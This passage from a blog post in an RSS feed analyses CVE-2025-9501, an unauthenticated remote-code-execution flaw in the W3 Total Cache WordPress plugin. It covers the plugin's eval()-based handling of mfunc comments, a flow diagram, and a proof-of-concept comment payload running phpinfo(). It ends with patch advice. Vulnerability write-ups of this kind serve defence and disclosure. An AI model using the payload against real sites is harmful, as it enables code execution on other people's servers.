class=&#34;nv&#34;&gt;$compressed_buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;_compress&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compression&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$compressed_buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;shutdown()&lt;/code&gt; calls &lt;code&gt;_parse_dynamic()&lt;/code&gt; to process dynamic HTML blocks and replace them with executed results:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;_parse_dynamic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DYNAMIC_SECURITY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*mfunc\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mfunc\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_parse_dynamic_mfunc&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_replace_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;~&amp;lt;!--\s*mclude\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(.*)--&amp;gt;(.*)&amp;lt;!--\s*/mclude\s*&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;W3TC_DYNAMIC_SECURITY&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\s*--&amp;gt;~Uis&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_parse_dynamic_mclude&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Each matched block is replaced by the executed content, ready for compression and output.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;User&amp;ensp;requests&amp;ensp;any&amp;ensp;frontâ€‘end&amp;ensp;page&amp;ensp;(unauthenticated)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;loads&amp;ensp;wp-settings.php&#34;]&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;WP_CACHE&amp;ensp;=&amp;ensp;true&amp;ensp;â†’&amp;ensp;Load&amp;ensp;advanced-cache.php&#34;]&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;advanced-cache.php&amp;ensp;runs&amp;ensp;Dispatcher&#34;]&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;PgCache_ContentGrabber-&gt;process()&#34;]&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;Util_Bus::add_ob_callback(&#39;pagecache&#39;,&amp;ensp;&#39;ob_callback&#39;)&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;WordPress&amp;ensp;renders&amp;ensp;full&amp;ensp;HTML&amp;ensp;into&amp;ensp;output&amp;ensp;buffer&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;ob_callback($buffer)&amp;ensp;triggered&#34;]&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I{&#34;_has_dynamic($buffer)&amp;ensp;?&#34;}&#xD;&#xA;I&amp;ensp;--&gt;|No|&amp;ensp;J[&#34;Return&amp;ensp;buffer&amp;ensp;as-is&amp;ensp;â†’&amp;ensp;Serve&amp;ensp;cached&amp;ensp;page&#34;]&#xD;&#xA;I&amp;ensp;--&gt;|Yes|&amp;ensp;K[&#34;Save&amp;ensp;buffer&amp;ensp;to&amp;ensp;_shutdown_buffer&#34;]&#xD;&#xA;K&amp;ensp;--&gt;&amp;ensp;L[&#34;register_shutdown_function(shutdown)&#34;]&#xD;&#xA;L&amp;ensp;--&gt;&amp;ensp;M[&#34;After&amp;ensp;request&amp;ensp;completes&amp;ensp;â†’&amp;ensp;shutdown()&#34;]&#xD;&#xA;M&amp;ensp;--&gt;&amp;ensp;N[&#34;_parse_dynamic(_shutdown_buffer)&#34;]&#xD;&#xA;N&amp;ensp;--&gt;&amp;ensp;O{&#34;HTML&amp;ensp;contains&amp;ensp;&lt;!--&amp;ensp;mfunc&amp;ensp;...&amp;ensp;--&gt;&amp;ensp;?&#34;}&#xD;&#xA;O&amp;ensp;--&gt;|Yes|&amp;ensp;P[&#34;_parse_dynamic_mfunc()&#34;]&#xD;&#xA;P&amp;ensp;--&gt;&amp;ensp;Q[&#34;Extract&amp;ensp;payload&amp;ensp;from&amp;ensp;comment&amp;ensp;and&amp;ensp;run&amp;ensp;eval()&#34;]&#xD;&#xA;O&amp;ensp;--&gt;|Or&amp;ensp;mclude|&amp;ensp;R[&#34;_parse_dynamic_mclude()&amp;ensp;(include&amp;ensp;type)&#34;]&#xD;&#xA;Q&amp;ensp;--&gt;&amp;ensp;S[&#34;Output&amp;ensp;replaced&amp;ensp;with&amp;ensp;execution&amp;ensp;result&#34;]&#xD;&#xA;R&amp;ensp;--&gt;&amp;ensp;S&#xD;&#xA;S&amp;ensp;--&gt;&amp;ensp;T[&#34;Page&amp;ensp;optionally&amp;ensp;compressed&#34;]&#xD;&#xA;T&amp;ensp;--&gt;&amp;ensp;U[&#34;echo&amp;ensp;back&amp;ensp;to&amp;ensp;user&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Install and activate the plugin.&lt;/li&gt;&#xA;&lt;li&gt;Enable Page Cache.&lt;/li&gt;&#xA;&lt;li&gt;Configure &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Comment on any post:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;mfuncvalue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;!--&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mfuncvalue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/result.png&#39; alt=&#34;Result&#34; height=&#34;1078&#34; width=&#34;1918&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;&#xA;The value of &lt;code&gt;W3TC_DYNAMIC_SECURITY&lt;/code&gt; may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; title=&#34;Used when Page Cache is forgotten to be enabled&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss Page Cache&lt;/h2&gt;&lt;p&gt;Used when Page Cache is forgotten to be enabled&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#39; alt=&#34;Miss Page Cache&#34; height=&#34;259&#34; width=&#34;427&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Used when Page Cache is forgotten to be enabled&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;CVE-2025-9501 arises because W3 Total Cache executes PHP in â€œdynamic fragment cachingâ€ (&lt;code&gt;&amp;lt;!--&amp;ensp;mfunc&amp;ensp;...&amp;ensp;--&amp;gt;&lt;/code&gt;) via &lt;code&gt;eval()&lt;/code&gt; without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during &lt;code&gt;shutdown()&lt;/code&gt;, after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the &lt;code&gt;eval()&lt;/code&gt; call, fixing the vulnerability.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;eval()&lt;/code&gt; in production code almost always results in RCE if input is uncontrolled.&lt;/li&gt;&#xA;&lt;li&gt;The plugin processes dynamic content &lt;strong&gt;after the full WordPress lifecycle&lt;/strong&gt;, bypassing many core protections.&lt;/li&gt;&#xA;&lt;li&gt;W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks.&lt;/li&gt;&#xA;&lt;li&gt;RCE triggers in &lt;code&gt;register_shutdown_function()&lt;/code&gt;, executing at the end of the request, making detection harder.&lt;/li&gt;&#xA;&lt;li&gt;Immediate plugin update is mandatory for systems using &amp;lt;= 2.8.12.&lt;/li&gt;&#xA;&lt;li&gt;Avoid &lt;code&gt;eval()&lt;/code&gt; in PHP unless strictly sandboxed and validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/command-injection.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Command Injection&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin &amp;lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
